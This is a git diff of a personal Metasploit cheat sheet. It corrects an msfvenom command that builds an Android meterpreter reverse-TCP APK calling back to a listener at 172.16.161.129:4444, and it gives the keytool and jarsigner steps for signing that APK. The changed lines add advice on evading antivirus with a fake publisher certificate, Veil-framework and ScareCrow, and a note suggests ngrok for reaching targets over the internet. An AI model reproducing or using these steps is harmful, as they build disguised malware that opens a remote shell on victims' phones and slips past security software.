@@ -23,7 +23,7 @@ search > searching of expiot,auxiliary,nops,payloads,posts
     Creation of payload 
     search android type:payload platform:android   
     1) generate -f raw -p android  -o ds.apk
-    2) msfvenom -p /android/meterpreter_reverse_tcp R LHOST=172.16.161.129 LPORT=4444  > msf_tcp.apk
+    2) msfvenom -p /android/meterpreter/reverse_tcp R LHOST=172.16.161.129 LPORT=4444  > msf_tcp.apk
     3) sign apk 
         a) keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
         b) jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore msf_tcp.apk hacked
@@ -34,6 +34,6 @@ search > searching of expiot,auxiliary,nops,payloads,posts
         set LPORT
         run
     note:- For WAN use portfordwing tools ngrock
-    to bypass anti-virous use veil-framework
+    to bypass anti-virous, add fake publisher certificate use veil-framework, ScareCrow 
 ---------------------------------------------------------------------------------------------------------------
 netexpose framework
